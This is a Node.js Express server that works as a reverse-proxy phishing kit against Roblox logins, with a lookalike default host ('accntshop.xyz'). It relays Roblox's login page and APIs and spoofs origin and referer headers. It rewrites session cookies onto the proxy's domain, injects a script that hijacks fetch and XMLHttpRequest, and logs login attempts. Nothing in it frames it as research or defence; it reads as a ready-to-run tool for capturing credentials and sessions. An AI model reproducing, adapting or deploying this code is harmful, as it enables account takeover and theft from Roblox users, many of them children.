const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - FIXED COOKIE DOMAIN');
console.log('='.repeat(60));

// Domain map
const SUBDOMAIN_MAP = {
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
};

const CDN_PREFIXES = new Set(['js-cdn', 'css-cdn', 'images-cdn', 'static-cdn', 'rbxcdn', 'content-cdn']);

// =========================
// Helpers
// =========================
function rewriteCookies(proxyRes, req) {
    const cookies = proxyRes.headers['set-cookie'];

    if (!cookies) return;

    const host = req.headers.host || 'accntshop.xyz';

    proxyRes.headers['set-cookie'] = cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
            .replace(/Secure;/gi, 'Secure; SameSite=None;');
    });
}

function buildInjectedScript(host) {
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${host}/${prefix}`)}]`)
        .join(',\n');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
    var DOMAIN_MAP = [
        ${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com",  PROXY_HOST],
        ["https://roblox.com",     PROXY_HOST],
        ["http://roblox.com",      PROXY_HOST]
    ];

    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < DOMAIN_MAP.length; i++) {
            var from = DOMAIN_MAP[i][0];
            var to   = DOMAIN_MAP[i][1];
            if (url.indexOf(from) === 0) {
                return to + url.slice(from.length);
            }
        }
        return url;
    }

    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        if (typeof resource === 'string') resource = rewriteUrl(resource);
        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
        return _fetch.call(this, resource, init);
    };

    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        return _open.apply(this, args);
    };
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    let result = body;

    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
    }

    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);

    return result;
}

// =========================
// Logging
// =========================
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// =========================
// AUTH API
// =========================
app.use('/auth-api', createProxyMiddleware({
    target: 'https://auth.roblox.com',
    changeOrigin: true,
    secure: true,
    pathRewrite: { '^/auth-api': '' },

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');

            if (req.headers['user-agent']) {
                proxyReq.setHeader('user-agent', req.headers['user-agent']);
            }

            if (req.path === '/v2/login') {
                console.log('🔑 LOGIN ATTEMPT');
            }
        },

        proxyRes: (proxyRes, req) => {
            rewriteCookies(proxyRes, req);

            if (req.path === '/v2/login') {
                console.log(`✅ Login response: ${proxyRes.statusCode}`);
            }
        },

        error: (err, req, res) => {
            console.error('[auth-api] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// APIS API
// =========================
app.use('/apis-api', createProxyMiddleware({
    target: 'https://apis.roblox.com',
    changeOrigin: true,
    secure: true,
    pathRewrite: { '^/apis-api': '' },

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('origin', 'https://www.roblox.com');
            proxyReq.setHeader('referer', 'https://www.roblox.com/login');
        },

        proxyRes: (proxyRes, req) => {
            rewriteCookies(proxyRes, req);
        },

        error: (err, req, res) => {
            console.error('[apis-api] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// OTHER APIS
// =========================
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    if (prefix === 'auth-api' || prefix === 'apis-api') continue;

    app.use(`/${prefix}`, createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },

        on: {
            error: (err, req, res) => {
                console.error(`[${prefix}] Error:`, err.message);
                res.status(502).send('Proxy error');
            }
        }
    }));
}

// =========================
// MAIN SITE
// =========================
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,

    pathRewrite: (path) => (path === '/' ? '/login' : path),

    on: {
        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const ct = proxyRes.headers['content-type'] || '';

            if (ct.includes('text/html')) {
                const host = req.headers.host;
                let body = buffer.toString('utf8');

                body = rewriteUrls(body, host);

                const script = buildInjectedScript(host);
                body = body.replace('<head', `<head>${script}`);

                return body;
            }

            return buffer;
        }),

        error: (err, req, res) => {
            console.error('[main] Error:', err.message);
            res.status(502).send('Proxy error');
        }
    }
}));

// =========================
// START SERVER
// =========================
const PORT = process.env.PORT || 8080;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
});
